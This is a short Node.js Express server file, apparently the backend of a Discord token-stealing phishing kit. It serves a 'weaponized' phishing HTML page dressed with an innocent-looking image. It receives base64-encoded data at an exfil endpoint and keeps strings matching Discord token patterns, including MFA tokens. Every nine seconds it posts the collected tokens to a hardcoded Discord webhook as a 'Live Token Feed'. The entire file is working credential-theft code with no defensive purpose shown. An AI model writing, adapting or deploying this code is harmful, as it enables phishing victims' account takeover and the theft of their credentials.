const express = require('express');  
const { readFileSync } = require('fs');  
const { join } = require('path');  
const axios = require('axios');  
const app = express();  

const WEBHOOK = "https://discord.com/api/webhooks/1352354085483053156/_mJb7zszAZ5ogi2Sxurfw6gYoECgIVMKdR7EDLO_jpbUhHmVWR2S6H2v4fxTMA98CbLw";  
let tokenQueue = [];  

// Serve weaponized HTML  
app.get('/api/phish', (req, res) => {  
    const html = readFileSync(join(__dirname, '../public/phish.html'), 'utf-8')  
        .replace('LEGIT_IMAGE', 'innocent_cat.jpg');  
    res.send(html);  
});  

// Exfil endpoint  
app.get('/_phantom/exfil/:uuid', (req, res) => {  
    try {  
        const token = Buffer.from(req.query.d, 'base64').toString();  
        if(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/.test(token)) {  
            tokenQueue.push(token);  
        }  
    } catch {}  
    res.sendStatus(204);  
});  

// Webhook flusher  
setInterval(async () => {  
    if(tokenQueue.length) {  
        await axios.post(WEBHOOK, {  
            embeds: [{  
                title: "Live Token Feed",  
                description: tokenQueue.join('\n'),  
                color: 0xFF0000  
            }]  
        }).catch(() => {});  
        tokenQueue = [];  
    }  
}, 9000);  

module.exports = app;  
